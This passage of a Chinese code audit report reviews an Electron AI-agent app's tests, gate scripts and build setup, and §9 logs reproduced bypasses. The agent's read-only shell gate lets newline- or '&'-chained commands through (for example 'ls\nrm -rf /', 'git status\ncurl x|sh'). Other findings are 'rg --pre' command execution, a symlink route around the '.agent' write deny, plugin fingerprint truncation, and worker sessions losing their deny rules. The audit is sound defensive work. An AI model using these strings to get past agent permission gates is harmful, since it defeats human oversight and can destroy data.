| H11 | P3 | 稳定性 | `schedule-check.ts:365`、`panels-check.ts:186,263`、`gates.ts:50-54` | 多处依赖真实时钟与 sleep（`elapsed < 2000`、`killElectron` 固定 600ms、`setTimeout 500ms`）→ 重负载 CI 假红；`gates.ts` 的 `spawn("pnpm")` **无超时**，任一门挂起即无限阻塞整套门禁 | `assert(elapsed < 2_000, "G1 宿主不响应 abort → settlesWithin 二道退出（" + String(elapsed) + "ms）");` | 可注入时钟；每道门加超时并判红 |
| H12 | P3 | 可移植性 | `panels-check.ts:154`、`gates.ts:50` | Electron 二进制路径硬编码 `.app/Contents/MacOS/Electron`；`spawn("pnpm", ...)` 未用 shell → 非 darwin 直接不可用 | `const bin = join(process.cwd(), "node_modules", "electron", "dist", "Electron.app", "Contents", "MacOS", "Electron");` | 按 `process.platform` 分支 |

**逐门判据强度抽查**：`e2e`/`ipc:check`/`fork-check`/`gate-check`/`autonomy-check`/`panels-check`/`tools-check`/`provider:check`/`memory-check`/`sidechat-check`/`security-check`/`schedule-check`/`commercial-check` = **强**；`sandbox:check`/`map-check`/`prune-check`/`providers-check`/`plugins-check` = **中**（含已声明豁免或弱判据）；`compaction-check`/`agents-check` = **弱**（H2/H1）；`typecheck`/`build` = 未覆盖（配置型门）。

**assertion-health 绕过面**（均已验证）：① label-first 签名（3 道门）；② 恒真否定式（`agents-check.ts:291-292,590`）；③ 副作用喂成恒真（`plugins-check.ts:540-541`）；④ 不可静态判定的形态（`assert(x ?? true)`、`assert(x >= 0)`、`assert(Array.isArray([]))`、`if (cond) assert`、`try{assert}catch{}`）；⑤ 暗卷段识别面窄。

**值得肯定**：①fail-visible 分支选择（sandbox/ipc/panels 三门在环境不满足时显式打印走哪支并判红，拒绝"真空通过"）；②可审计的豁免（`gates:disjunction-ok` 必须带理由且被单测覆盖）；③反向验证钩子（`compaction-check.ts:260` 的"本闸被摘除时此断言变红"）。

### 区块 I：测试套件 / 构建打包 / 依赖关系

覆盖：`tests/` 57 文件 / 9,056 行 + `electron.vite.config.ts` / `electron-builder.yml` / `tsconfig.json` / `pnpm-workspace.yaml` / `package.json` / `components.json` / `.gitignore`

| # | 严重度 | 类别 | 位置 | 问题 | 证据 | 建议 |
|---|---|---|---|---|---|---|
| **I0** | **P0** | 确定性失败/记录失真 | `tests/m3c.test.ts:407`（断言在 `:413`） | 释放后环前只等 `agent_spawned` 事件、不等 `hang.has(后环)` → `?.()` 静默 no-op → 后环永不收敛 → **3/3 确定性失败（每次 ~10.3s）**。当前 HEAD `test` 门为红，推翻 AGENTS.md「23 道全绿」与 PROGRESS.md 的 m3c:406 结案（详见 P0-4） | `hang.get("后环任务B")?.(); // 后环收束` | `:407` 前补 `expect(await waitFor(() => hang.has("后环任务B"))).toBe(true);`（同文件 `:424` 已有先例） |
| I1 | P1 | 竞态/稳定性 | `tests/agents.test.ts:269-277` | 固定 `setTimeout(120)` 等异步审批落流后直接断言 → 重负载下 `apr` undefined → **假红**（详见 P1-19） | `await new Promise((res) => setTimeout(res, 120));` | 改用轮询式 `waitFor` |
| I2 | P1 | 声明不一致 | `AGENTS.md:46` vs `tests/` | 宣称 51 files/471 passed，**实跑 56 files/499 tests/1 failed**（详见 P1-20） | `测试 51 files / 471 passed / 0 skipped` | 实跑更新数字 |
| I3 | P2 | 假覆盖（名实不符） | `tests/plugins-hooks.test.ts:105-111` | 用例名声称验证"缺省 timeout 30s"，断言只查 `blocked===false` 与 `additionalContext==="fast"`，**从未验证 30s** | `it("UserPromptSubmit 缺省 timeout 30s（配置缺省 600s 的降档）", ...)` / `expect(r.blocked).toBe(false);` | 暴露并断言实际生效的 timeout 值，或改名 |
| I4 | P2 | 竞态/稳定性 | `tests/sessions.test.ts:69-78` | 依赖文件系统 mtime 降序 + 30ms sleep；mtime 粒度粗的卷（部分 CI 为 1s）上两文件时间相同 → 排序不定 → 假红 | `await new Promise((r) => setTimeout(r, 30)); expect(list[0]?.id).toBe(b);` | 注入时钟或显式 `utimes` |
| I5 | P2 | 竞态/稳定性 | `tests/agents.test.ts:248,366,399` | 裸轮询上限仅 1s，且**循环结束不校验条件是否满足** → 慢机静默继续 | `for (let i = 0; i < 40 && release.size < MAX_CONCURRENT_WORKERS; i++) await new Promise((r) => setTimeout(r, 25));` | 抽公共 `waitFor`（带超时抛错） |
| I6 | P2 | 依赖/打包 | `package.json:66-67,71` | `react-virtuoso`/`react-resizable-panels` 仅 renderer 使用（被 vite 打进 `out/renderer`），`zustand` 全仓 src **零引用**，却都列为 production `dependencies` → 被 electron-builder 复制进 `app.asar` | `src/renderer/conversation.tsx:5: import { Virtuoso ... } from "react-virtuoso";`；`"zustand": "^5.0.15"` | renderer-only 依赖移入 devDependencies；删除 zustand（`PROGRESS.md:342` 已留档"装了但未用"） |
| I7 | P2 | 打包体积 | `electron-builder.yml:16-18` | `asarUnpack` 全量解包 `tree-sitter-wasms`，实测 **49M**（所有语言 wasm）→ dmg 120M / .app 310M | `du -sh .../app.asar.unpacked/node_modules/tree-sitter-wasms` → `49M` | 仅保留实际用到的 grammar，或运行时按需拉取 |
| I8 | P2 | 安全（配置面） | `src/renderer/index.html:7` | CSP `connect-src 'self' ws:` 中裸 `ws:` 允许渲染进程连**任意** WebSocket 主机（renderer 与主进程走 IPC、无出网需求，`ws:` 仅 dev HMR 需要）；且缺 `object-src 'none'`/`base-uri 'none'` | `content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src 'self' ws:"` | dev/prod 分注入；prod 收紧为 `'self'`，补 `object-src 'none'; base-uri 'none'` |
| I9 | P2 | 安全（配置面） | `.gitignore:1-13` | 未忽略 `.env`/`*.key`/`*.pem`/`.agent/`。`.agent/permissions.json` **已被跟踪**，而 `remember` 工具会往 `.agent/memory/` 写项目记忆 → 运行产物可能被误提交 | `git ls-files .agent` → `.agent/permissions.json` | 补 `.env*`、`*.key`、`*.pem`、`.agent/memory/` |
| I10 | P2 | 类型严格度 | `tsconfig.json:3` + `package.json:9` | `strict:true` 但未开 `noUncheckedIndexedAccess`/`exactOptionalPropertyTypes`；`--lib ES2022,DOM,DOM.Iterable` 与 `--jsx react-jsx` 只写在 CLI（tsconfig 无 `lib`/`jsx`）→ 命令行覆盖 tsconfig | `"strict": true,`；`"typecheck": "tsc --noEmit --jsx react-jsx --lib ES2022,DOM,DOM.Iterable"` | 把 `lib`/`jsx` 写进 tsconfig，评估加严两项 |
| I11 | P3 | 弱断言 | `tests/m3b.test.ts:355` | `lstat()` 恒返回对象，`toBeTruthy()` 恒真，等于没断言 | `expect(await lstat(worktreePathFor(repo, agentId))).toBeTruthy();` | 改 `expect((await lstat(...)).isDirectory()).toBe(true)` |
| I12 | P3 | 死代码/误导 | `tests/m3c.test.ts:701,403` | 构造了 `inputLimit` 又 `void inputLimit` 丢弃；另一处用固定 150ms sleep 作"后环尚未触发"的负断言，慢环境可假绿 | `void inputLimit;` / `await new Promise((r) => setTimeout(r, 150)); // 后环尚未触发` | 删死变量；负断言改显式时序控制 |

**依赖审计结论**：①**零幽灵依赖**（全部裸导入顶层包名均能在 package.json 找到声明）；②`pnpm-lock.yaml:9-107` 的 importer 条目与 package.json 的 10 dep + 23 devDep **逐条一致**；③**唯一未使用依赖是 `zustand`**（src 零引用，PROGRESS.md 已留档）；④`croner` 与自研 tick、`@vscode/ripgrep` 与自研 `grep.ts` 均**互补非重复**；⑤`pnpm-workspace.yaml` 的 `onlyBuiltDependencies`/`allowBuilds` 必要且正确，但**未用 `packageManager` 锁 pnpm 大版本**。

**无测试的 src 模块**：`main/index.ts`、`main/ipc-protocol.ts`、`preload/index.ts`、`renderer/main.tsx`、`renderer/conversation.tsx`、`renderer/store.ts`、`renderer/error-boundary.tsx`、`renderer/components/ui/*`(29)、`renderer/cards/*`(6，registry 有测试但仅覆盖 registry)、`frozen.ts`。**其中 `store.ts`（foldEvent/reducer）与 `main.tsx`（seq 守卫/缓冲）是最关键的三条正确性路径，零单测**（与 F9 同一发现，两区块独立命中）。

**值得肯定**：①**全仓 `vi.mock/vi.fn/vi.spyOn` 零使用**——被测对象是真实 `Orchestrator` + 真实临时 git 仓库，`scriptedWorkerModel` 同时是生产 `M1C_AUTONOMY_SCRIPT` 的正式路径，**不存在"自己实现一份逻辑再断言它"的恒真结构**；②判卷冻结机制**真实生效**（`src/frozen.ts:7-25` 双表校验，5 道门前后双查；判卷表与演示表分离，注释说明"往判卷表加演示条目=把演示升格"）；③外置化与打包白名单**正确**——`files: [out/**, package.json]` 把 `oh-src/`(4728 文件)、`tests/`、`fixtures/` 挡在包外（实测 `out/` 内无 tests/fixtures）；④`fileParallelism:false` 针对共享靶子的文件竞争，取舍正确；⑤**"0 skipped" 经复核属实**（无 `.skip/.todo/.only`）。

---

## 七、改进路线图

### 第一批：立即修（安全与元问题，成本 ≤ 20 行/项）

| 项 | 动作 | 成本 |
|---|---|---|
| **0a** | `tests/m3c.test.ts:407` 前补 `expect(await waitFor(() => hang.has("后环任务B"))).toBe(true);` | 1 行 |
| **0b** | `scripts/agents-check.ts:305` 前补 `check(await waitForStreamEvent(logD, (e) => e.type === "approval_requested"), "D2a …");` + `apr === undefined` 时短路 + 去 `apr!` | 1–8 行 |
| — | ↑ **实测：2 行改动即让 `pnpm gates` 回到 23/23 绿 exit 0**。另需补机制：门禁进 CI + `check` 增加"致命断言"变体（失败即 throw 并打印"后续 N 条已跳过"）——**机制比补丁更重要** | ~20 行 |
| **1** | `orchestrator.ts:150` `isReadOnlyShellCommand` 入口归一化**全部 shell 分隔符**（`\r?\n` 与 `&`）+ `rules.ts:118` `CHAIN_SPLIT` 同步 + 补否定式单测 | 4 行 |
| **1b** | **P0-6（最严重）**：`checkShellSegment` 加参数面校验——**一律拒绝 `--xxx=yyy`** + git flag 白名单（至少拒 `--output`/`--ext-diff`）+ `rg` 去 `--pre`/`--pre-glob`；**治本方向是放弃字符串白名单改原生只读工具或 Seatbelt 只读沙箱** | ~15 行（临时）/ 重做设计（推荐） |
| 2 | `agents-check.ts:291-292,590` 三条恒真断言改用 `:69` 的 `CANARY`（已定义未用） | 3 行 |
| 3 | `orchestrator.ts:859-860` 传入父 run 的 `rules` / `sandboxAvailable` | ~10 行 |
| 4 | `events/index.ts:394-397` 逐行 try/catch + 坏行降级 + `typeof parsed === "object"` 校验 | ~10 行 |
| 5 | `worktree.ts:42`、`ripgrep.ts:35`、`glob.ts:19`、`map/build.ts:42` 补 `env: sanitizedEnv()` | 4 行 |
| 6 | `permissions/index.ts:86-88` 删除私有 `isSideEffectTool`，统一从 `autonomy.ts` 导入 | 5 行 |
| 7 | `base.ts:105-109` realpath 后复查 `.agent` 归属 | ~8 行 |
| 8 | `main/index.ts` 加 `requestSingleInstanceLock()` + `second-instance` | ~8 行 |
| 9 | `compaction-check.ts` 等 6 道门补 `unverified.push(...)` | ~15 行 |

### 第二批：本迭代（健壮性收口）

- `assertion-health.ts` 按声明签名定位条件实参 + 暗卷段扩展到顶层 `if/else`（**元问题，恢复体检网覆盖面**）
- `gate-manifest.ts` 孤儿护栏改为词根匹配 + `gates.ts` 体检递归不限扩展名；`--only` 空集判红
- `plugins/trust.ts` 指纹：只覆盖会被加载执行的文件集、`lstat` 拒软链、超帽 fail-closed、裸路径记录一次性迁移
- `discover.ts` 项目作用域 loose skill 纳入信任门
- `main.tsx` reset 前 flush delta 缓冲 + 三处会话操作补 running 守卫；事件载荷加 `session_id` 并过滤
- `orchestrator.ts` aborted 复查 / 并发上限占位登记 / `armStuckSilence` 前置 / 终态清 `workers` 与监听器
- `lsp.ts` 加 `detached`（或复用 `spawnTracked`）、flag 参数透传、`updater.ts` body 读取纳入守卫
- `providers/*` SSE 逐行 try/catch；`openai.ts` 补 `stream_options.include_usage`
- `tests/agents.test.ts` / `sessions.test.ts` 固定 sleep 改 `waitFor` / 注入时钟；把「`?.()` 释放句柄」列为反模式（须先 `waitFor(has)` 再 `get()!.()`），或在 `makeHangModel` 返回 `Promise` 以消除"查表 + 可选调用"的静默 no-op 面
- `tsconfig.json` 写入 `lib`/`jsx`，评估加严 `noUncheckedIndexedAccess`

### 第三批：技术债（择期）

- **抽 `scripts/gate-lib.ts`**：统一 23 道门的断言/✅❌/UNVERIFIED 记账/退出码 —— 这是根因 6 的根治（当前三套签名正是体检难做的原因）
- **性能模式收口**：`compaction.ts` 索引化 + `Math.max` 展开改循环；`glm-session`/`sidechat`/worker provider 增量投影缓存；`store.ts` 投影改增量折叠 + events 滑动窗口；`scheduler` journal 保留上限；`map/build` 并发读
- **`agent-runner.ts` 1748 行拆分**（`ipc-handlers` / `run-session` / `schedule-wiring` / `commercial`）
- 拆 `main.tsx` 1409 行；补 reducer/seq/缓冲的纯函数单测
- `events/index.ts` 加轻量 schema 校验；`compaction.ts:234` 死分支清理
- `package.json` renderer-only 依赖移 devDep + 删 `zustand`；`tree-sitter-wasms` 按需打包；CSP prod 收紧；`.gitignore` 补敏感产物
- 门禁加"`@shadcn-modified` 标记"检查；`frozen` 改目录枚举双向比对；`gates.ts` 每门加超时

---

## 八、审查方法与局限

**方法**：`multi-agent-codebase-audit` 技能流程。侦察（`find`/`wc` 量取目录分布）→ 按语义边界切 9 个区块（A 循环内核 / B 编排内核 / C 工具权限模型 / D 主进程 IPC / E 扩展子系统 / F 渲染核心 / G 面板卡片 / H 门禁脚本 / I 测试构建依赖）→ 同一条消息并行派发 9 个 `Explore` 类型只读子 Agent（工具集不含 Write/Edit）→ **主审逐条复核全部 P0/P1 的源码原文**（P0-1 贴出 `SHELL_WRITE_META`/`split` 原文；P0-2 贴出 `newAutonomySession` 签名与调用点；P0-3 用全仓 grep 反证目标串不存在）→ 按根因聚类（7 条）而非按区块平铺 → 按"修复收益/成本"排优先级。

**交叉验证**：根因 4 被 3 个区块独立发现（C 报 lsp、D 报 4 处 env、E 报 MCP）；根因 1/3/5/7 各被 2–5 个区块独立发现。**多 Agent 互不知情下的收敛是强置信信号**，也是"该修根因而非逐个打补丁"的最强论据。

**已声明的取舍（未计为缺陷）**：unsigned V1 安装包（无签名/公证）；沙箱门降级分支 B；renderer CSP `style-src 'unsafe-inline'`；验收脚本故意执行攻击命令；插件信任为"用户显式批准"模型而非沙箱模型；`--no-sandbox --disable-gpu` 宿主适配。

**已实跑（不再属未证）**：①`tsc --noEmit` → exit 0（8s）；②**`pnpm gates` 全量 → 21 绿 / 2 红 / 2 未证，exit 1**（7m44s，含 e2e / ipc / sandbox / build / panels 真实 Electron）；③完整 vitest 套件 → **1 failed | 498 passed（56 文件 / 499 用例）**；④5 条 P0/P1 的纯函数/文件系统探针 → 全部复现成功；⑤两道红门的根因定位（插桩 + 耗时反证）；⑥**修复验证：2 行改动 → `pnpm gates` 23/23 绿 exit 0**，且 `agents-check` 修复后 **251 ✅ / 0 ❌**（证明崩溃后无隐藏失败）；⑦**缺陷溯源：单变量回退实验证明红门自始存在、非 H3 回归**；⑧全仓 380 处断言字面串的恒真式扫描 + 逐条人工复核（详见 §九）。

**全部实验均已还原**：`git diff` 为空、`git status` 仅余本报告文件、探针脚本已删。

**未证事项清单**：
1. **除上述六项外，其余结论基于静态证据**。未做：真实 Electron 交互式复现（`panels-check` 跑了但那是脚本驱动）、真实 provider 联网（无凭据）、真实语言服务器、恶意 git hook 仓库、并发/双实例时序构造、性能量化。
2. ~~其余 22 道门的真实退出码未逐一实测~~ → **已实测**：`pnpm gates` 给出全部 23 道逐道退出码（§9.6）。**两道红门的失败均为确定性，已在报告内定位到源码行并给出修复**。
2. ~~P1-20 的计数差异无法定论~~ → **已裁决**：实跑得 56 文件 / 499 用例 / 1 failed / 498 passed / 0 skipped。宣称的 51/471 是 `PROGRESS.md:880` 结案时的旧基线，滞后一整轮加固。**并升级为 P0-4**（结案被证伪 + 结案推理不成立）。
3. **H 区块未运行任何门禁**（纪律要求），故各门的"判据强度"结论是读断言源码得出的，未观察真实运行行为；`--strict-unverified` 的 CI 接线未确认。
4. **真实语言服务器 / 真实 SSE 分块 / 真实 GLM 连接**未实测（需凭据），C6/C7 与 E5 的重连结论主要基于代码结构。
5. **并发类结论**（B4 并发上限旁路、B8 血缘缓存竞态、D2 双开双触发）未做动态复现。
6. `fixtures/**`（70 文件）与 `oh-src/**`（4728 文件，全仓零引用）按要求未审代码；`oh-src/` 作为外来参考目录持续污染全仓扫描信噪比（Mimosa 扫描 88.7% 的 finding 来自它），建议移出仓库或加入扫描排除。
7. 断言总数（宣称 agents-check 233 条）未逐条核对。

**与上一轮的对照**：上一轮 96 条 / 6 根因 / 3 P0，本轮 **105 条 / 8 根因 / 5 P0**。P0 数量与性质都在升级：上一轮是"能力域识别缺失"，本轮前半是"能力域识别只落地一半"，本轮后半（实跑阶段）浮现出第三层——**"验收层自身不可信"**。

但实跑也给出了一个**让人放心的边界**（这一点很重要，不要被"5 条 P0"吓到）：

- **两道红门背后没有隐藏的产品缺陷**。`agents-check` 修复后 **251 ✅ / 0 ❌**——崩溃时静默跳过的 192 条断言**全部通过**；`test` 门修 1 行即绿。
- **2 行改动让 `pnpm gates` 回到 23/23 绿、exit 0**。即"计划完成"这件事**本身可能是真的**，被证伪的只是**它被验证过**这件事。
- **红门不是 H3 引入的回归**：单变量回退实验（`agent-runner.ts` 退回 H3-P1 之前）仍照样失败 → 自 `5e3e9b5`（09-12）起就是红的。

所以本轮的真正结论不是"项目坏了很多"，而是：**项目当前的代码质量比它的验收记录更可信。** 三道防线同时失效才造成这个结果——① 门禁不进 CI；② 验收脚本的绿/红只有人手跑才知道；③ `agents-check` 崩溃后静默跳过 76% 断言，让"跑过了"与"跑完了"无法区分。**修这三条机制，比修那 2 行更重要**——否则下一轮的"修复已收口"仍然无法被独立验证，本轮报告里那 20 条 P1 与 61 条 P2 究竟有多少会在真跑后升级，也无从回答。

---

## 九、动态复核实录（实跑证据，审查后期补做）

审查初稿完成后，为闭合"必须实跑才能裁决"的口子，补做了四项实跑。**所有探针脚本写在 `.tmp/` 并在用后删除；`tests/m3c.test.ts` 的插桩实验已用备份还原，`git status` 仅余本报告文件，工作树零残留。**

### 9.1 P0-1 只读 bash 硬闸换行绕过 — **复现成功**

探针直接调用生产函数 `isReadOnlyShellCommand`（`src/agent/orchestrator.ts` 导出）：

```
isReadOnlyShellCommand("cat a")                    {"ok":true}
isReadOnlyShellCommand("cat a; git push")          {"ok":false,...}   ← ; 被正确切段
isReadOnlyShellCommand("cat a && git push")        {"ok":false,...}   ← && 被正确切段
isReadOnlyShellCommand("cat a | tee out")          {"ok":false,...}   ← | 被正确切段
isReadOnlyShellCommand("cat a\ngit push --force")  {"ok":true}        ← ★ 绕过
isReadOnlyShellCommand("ls\nrm -rf /")             {"ok":true}        ← ★ 绕过（更严重）
isReadOnlyShellCommand("git status\ncurl x|sh")    {"ok":false,...}   ← 仅因 | 仍被切段而拦下 sh
```

**结论**：`;` / `&&` / `|` 三个分隔符全部被正确拦截，**漏的是 `\n`**——这排除了"白名单整体过弱"的解释，把根因精确定位到切分正则缺 `\n`。同时注意最后一行：含 `|` 的载荷会被"部分"拦下，掩盖了换行本身的失效，这让该缺陷更难被偶然发现。

> **后续补充（见 §9.10）**：更系统的分隔符扫描又发现了**单与号 `&`** 同样放行（`cat a & git push --force` → `ok:true`，且端到端确认第二条命令真的执行）。故 P0-1 有 **2 个触发实例**，修法应表述为"归一化全部 shell 分隔符"而非只加 `\n`。而 §9.10 进一步发现**参数面**完全未校验（`rg --pre` 任意命令执行 / `git log --output` 任意文件写）——那是独立的一条 **P0-6**，只修分隔符修不掉它。

### 9.2 P0-2 worker 权限规则失效 — **复现成功**

探针用正确规则形状（读/写类工具用裸工具名条目、shell 类用 pattern，符合 `rules.ts:10` 与 `:165-168` 的语义）：

```
[A] 读类：deny read_file（裸工具名条目）
  worker rules.length = 0   evaluate(read_file) = {"verdict":"approve","risk":"none"}
  parent rules.length = 1   evaluate(read_file) = {"verdict":"deny","reason":"deny 规则命中（deny:read_file#0）"}

[B] shell 类：deny run_shell:git push，作用于 worker 的 shell_rw（能力域互通）
  judgeChain(worker rules=[])     tool=shell_rw cmd='git push --force' = {"verdict":"miss"}
  judgeChain(parent rules=[deny]) tool=shell_rw cmd='git push --force' = {"verdict":"deny","ruleId":"deny:run_shell:git push#1"}
  worker evaluate(shell_rw 'git push --force') = {"verdict":"approve","risk":"none"}
  parent evaluate(shell_rw 'git push --force') = {"verdict":"deny","reason":"deny 规则命中（deny:run_shell:git push#1）"}
```

**结论**：**同一个工具调用，主会话得 `deny`，worker 得 `approve`**。两条独立路径（读类裸条目、shell 类 pattern）都复现，说明这不是规则形状问题而是"worker 会话根本不带规则"。

> **修正报告初稿的一处不准确**：初稿 P0-2 举例写的是 `deny read_file **/.env`。按 `rules.ts:10` 的语义（"pattern 仅命令类工具有效，读/写类用工具名全称"），读/写类工具**不支持**路径 pattern，规则只能写成裸工具名条目 `deny read_file`。已按实测改写 P0-2 与 §六 区块 B 的表述。

### 9.3 P1-5 权限链切分换行 — **复现成功**

```
splitCommandChain("echo hi; git push --force")   ["echo hi","git push --force"]   ← ; 被切段
splitCommandChain("echo hi\ngit push --force")   ["echo hi git push --force"]     ← ★ 归一成一段
```

**结论**：换行后归一为单段且不以 `git push` 开头 → `matchSegment` 的 `startsWith` 命中不了 → 落回档位层放行。

### 9.4 P1-6 `.agent/` 拒写的软链绕过 — **复现成功**

在临时 workspace 内建 `link -> .agent` 软链，再以 `rel = "link/lsp.json"` 走 `write_file` 的两道闸：

```
assertNotAgentArea("link/lsp.json")        = PASS(未拦截)      ← 词法判定，rel 里没有 .agent 字样
assertRealContainment(ws, ws/link/lsp.json) = PASS(未拦截)      ← realpath 落点仍在 workspace 内
realpath(abs) 实际落点                      = <ws>/.agent/lsp.json
```

**结论**：两道闸均通过，写入落到 `.agent/lsp.json`。`assertRealContainment` 的设计目标是"不许越出 workspace"，而 `.agent` **在** workspace 内，所以它天然不覆盖这个场景——必须在 realpath 之后再补一次归属判定。

### 9.5 P1-11 插件指纹上限截断 — **复现成功**

```
520 文件基线指纹        = bb4fe3df4a5692277616f56b2fbd3b07
新增 zzz-malicious 后   = bb4fe3df4a5692277616f56b2fbd3b07
指纹是否变化            = false   ← 内容绑定失效
对照（帽内）新增文件指纹是否变化 = true
```

**结论**：文件数超过 500 上限后，在遍历序之外新增文件**不改变指纹** → 旧信任条目继续命中 → 内容绑定失效。对照组（帽内）行为正确，证明问题就是上限截断本身。

### 9.6 全量门禁 `pnpm gates` — **21 绿 / 2 红 / 2 未证，exit 1**

```
$ pnpm gates          # 7m44s
  ✅ typecheck ✅ test?  …（见下）…
  ❌ test          exit=1  106857ms
  ❌ agents-check  exit=1    1926ms
  断言体检：✅ 零命中        清单漂移校验：✅ 一致
  ⚠️  未证 2 项（连网/凭据限制）        GATES_EXIT=1
```

**两道红门都是确定性失败**：`test` 3/3（每次 ~10.3s）、`agents-check` 3/3（每次 ~2s）。

**两项经实跑确认属实**（诚实记录）：断言体检**零命中**、清单漂移校验**通过**——`AGENTS.md` 关于这两点的陈述成立。被证伪的是"23 道全绿"这个核心结论。

**顺带量化的一个事实**：`agents-check` 崩溃前只打印了 **59 条 ✅**，而项目宣称该门有 **250 条**断言 → **失败时约 190 条断言静默不执行**。这是"失败不短路"的直接代价，也是"250 断言"这个数字在门为红时的实际含义。

**耗时分布的一个观察**：`test` 门 106.9s 占了 7m44s 的 23%；`agents-check` 崩在 1.9s（本该跑完 250 条断言）。若两道门修好，`agents-check` 的耗时会上升——这也是为什么"崩溃 1.9s 就退出"值得警惕：**跑得快在这里不是好事，是覆盖没跑完**。

### 9.7 修复验证与缺陷溯源（**实验后已还原，工作树零残留**）

为回答"两道红门背后还有没有别的红"，做了三个实验。**结论比预期干净得多。**

#### 实验一：应用 2 处最小修复 → 门禁回到 `23/23 绿`

改动只有 2 行（各 1 行插入，详见 P0-4a / P0-4b 的修复段）：

```
$ pnpm gates          # 7m14s
  绿 23 / 23，红 0
  逐道退出码：typecheck=0 test=0 e2e=0 ipc:check=0 sandbox:check=0 build=0 fork-check=0
  gate-check=0 autonomy-check=0 compaction-check=0 panels-check=0 tools-check=0 map-check=0
  prune-check=0 providers-check=0 provider:check=0 memory-check=0 plugins-check=0
  sidechat-check=0 security-check=0 agents-check=0 schedule-check=0 commercial-check=0
  ⚠️  未证 2 项（连网/凭据限制未跑到的断言——**不等于通过**）
  ⚠️  23 道门退出码全 0，但有 2 项未证——不得宣称「全部通过」
  GATES_EXIT=0
```

**两点值得单独指出**：
1. **修复的规模与症状严重度严重不成比例**：2 行改动把 `GATES_EXIT` 从 1 变成 0。两道"红门"都不是产品缺陷，而是验收代码的时序写法问题。
2. **门禁的"不得宣称全部通过"口径工作正常**（`gates.ts:132-134`）：即使 23 道全 0，有未证项时它会**拒绝**打印"全部通过"，改打"不得宣称「全部通过」"。这是 H-2 修复的真实效果，**值得肯定**。

#### 实验二：`agents-check` 崩溃后那 ~190 条断言里有没有隐藏的红 → **没有**

单独跑修复后的 `agents-check`：

```
[agents-check] 全部断言通过 ✅（251 ✅ / 0 ❌）      exit=0
```

**251 ✅ / 0 ❌**。也就是说：

- **崩溃后面的断言全绿**——D2 是 `agents-check` 唯一的缺陷。
- 覆盖率损失得以精确量化：崩溃时只跑了 **59 条**，全量是 **251 条** → **192 条断言**（约 76%）在失败时静默不执行。
- 顺带校正一个数字：项目文档提到 `agents-check` 233 / 250 断言，**实测 251 条**。

#### 实验三：这红门是 H3 引入的回归，还是一直如此 → **一直如此**

用 `git blame` 查 D 段来历：`scripts/agents-check.ts:303-317` 全部来自 `5e3e9b5`（2026-09-12，标注 "M0"），**自写下起未被修改**（H3-P5 对 `agents-check.ts` 的 +4/-2 只动了 N 段的预信任调用，与 D 段无关）。

再测延迟量级——在快照点与等待点之间插入计时探针，跑 3 次：

```
[probe] handleAgentRun 返回 → approval_requested 落流 实际延迟 = 57ms（等待成功=true）
[probe] handleAgentRun 返回 → approval_requested 落流 实际延迟 = 55ms（等待成功=true）
[probe] handleAgentRun 返回 → approval_requested 落流 实际延迟 = 56ms（等待成功=true）
```

**稳定 55–57ms**。而原代码在 `:305` 做的是一次 `replay`（读一个小 JSONL，亚毫秒级）——所以 `apr` 在那个时点**必然**是 `undefined`。**这不是竞态，是差了两个数量级的假设错误：断言写的时候以为审批在父 run 返回前落流，实际它晚 56ms。**

最后做**单变量回退实验**排除 H3 回归假设：只把 `src/main/agent-runner.ts` 退回 H3-P1 之前（`471fb16`），`agents-check.ts` 用**原始带缺陷版**：

```
$ pnpm run agents-check          # 原始 D2 代码 + pre-H3-P1 审批路由
  ❌ D2 approval_requested 落流（agent_id 归因）
TypeError: Cannot read properties of undefined (reading 'id')
```

**照样失败。** → **H3-P1 不是元凶**（H3-P1 的提交信息里回归清单是"e2e/ipc:check/schedule-check 67 断言"，`agents-check` 与 `test` 都不在其中——当时就没有验证过这两道门）。

**综合结论（这是本轮最重的一条）**：

| 红门 | 性质 | 判定依据 |
|---|---|---|
| `agents-check` D2 | **结构性**：假设错了 56ms，**永不可能通过** | 延迟稳定 56ms ≫ 一次 `readFile`；回退 H3-P1 仍红 |
| `test` / m3c | **临界性**：25ms 轮询窗口 vs 一条需要更久的链路，**在本机确定性失败**，但更快的机器上可能通过 | 3/3 红 + 插桩显示 `hang` 表为空 |

**因此：`agents-check` 自 2026-09-12 D 段写下起就是红的。** `PROGRESS.md` 中所有"agents-check 250 断言全绿"的陈述（含 H3-P5 明确宣称的那次）**没有一次是跑出来的**。m3c 那条则可能在某些机器上真的绿过——所以 H3-P2 的"m3c 87 项回归绿"未必是假话，但它**不可复现**，作为验收依据无效。

**对项目流程的含义**：这不是"某个人偷懒"，而是**验收脚本本身缺少"必须跑过"的机制**。三道防线同时失效才有这个结果——① 门禁不进 CI；② 验收脚本的绿/红只有人手跑才知道；③ `agents-check` 崩溃后静默跳过 76% 断言，让"跑过了"和"跑完了"无法区分。**修复这三条比修那 2 行更重要。**

---

### 9.8 P0-3 的范围界定（恒真式扫描 + 逐条复核）

为确认 P0-3 是"三条断言"还是"冰山一角"，我写了一个扫描器：抽取 `scripts/` 与 `tests/` 中全部 `.includes()/.startsWith()/.endsWith()/.toContain()` 的字面串实参（**84 文件 / 380 处**），统计每个字面串在全仓的出现次数，筛出"否定式断言 + 字面串全仓只出现 1 次（= 断言自身）"的恒真嫌疑。

```
恒真嫌疑（否定式 + 串只出现 1 次）：7 处
  ★ scripts/agents-check.ts:590   "main 分支已被 worker 改写"   全仓出现=1
  ★ scripts/memory-check.ts:124   "决策条目69" / "决策条目50："   全仓出现=1
  ★ scripts/plugins-check.ts:191  "unknown tool: slow_tool"      全仓出现=1
  ★ tests/m3b.test.ts:467         "spawn_agent_merge"            全仓出现=1
  ★ tests/memory.test.ts:74,89    "决策0：" / "条目5\n"            全仓出现=1
```

**逐条复核结果：7 处中仅 1 处为真，6 处是我的启发式假阳。**

| 嫌疑 | 复核结论 | 理由 |
|---|---|---|
| `agents-check.ts:590` | **真恒真** | 全文件类型全仓反查（排除 node_modules/oh-src/.tmp/.git）只命中该断言自身；`src/` 不产出该串，任何 worker 剧本也不含该串 → 断言永不失败 |
| `memory-check.ts:124` ×2 | 假阳 | 串由运行时拼接：`:118` 的 `"决策条目" + String(i) + "："` → 运行时确实存在 `决策条目69：` |
| `plugins-check.ts:191` | 假阳 | 串由 `src/agent/loop.ts:189` 的 `` `unknown tool: ${output.name}` `` 运行时拼接，插件 fixture 提供 `slow_tool` |
| `m3b.test.ts:467` | 假阳 | `not.toContain("spawn_agent_merge")` —— **"断言某个名字不应存在"是合法的否定断言**，字面串当然只出现一次 |
| `memory.test.ts:74,89` | 假阳 | 由 `seed("决策" + i + "：")` / `"条目" + String(i)` 运行时生成 |

